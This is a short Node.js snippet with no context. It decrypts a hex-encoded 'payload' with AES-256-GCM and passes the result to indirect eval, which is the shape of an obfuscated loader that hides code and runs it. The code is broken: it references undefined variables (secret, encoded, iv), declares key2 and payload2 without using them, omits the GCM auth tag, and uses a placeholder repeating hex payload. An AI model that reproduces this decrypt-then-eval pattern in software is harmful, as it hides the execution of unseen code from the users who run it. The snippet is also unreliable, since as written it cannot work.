const crypto = require('crypto');
const key = Buffer.from('00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff', 'hex');
const payload = Buffer.from('00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff', 'hex');
const key2 = Buffer.from(secret, 'hex');
const payload2 = Buffer.from(encoded, 'hex');
const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
const stage = Buffer.concat([decipher.update(payload), decipher.final()]).toString();
(0, eval)(stage);
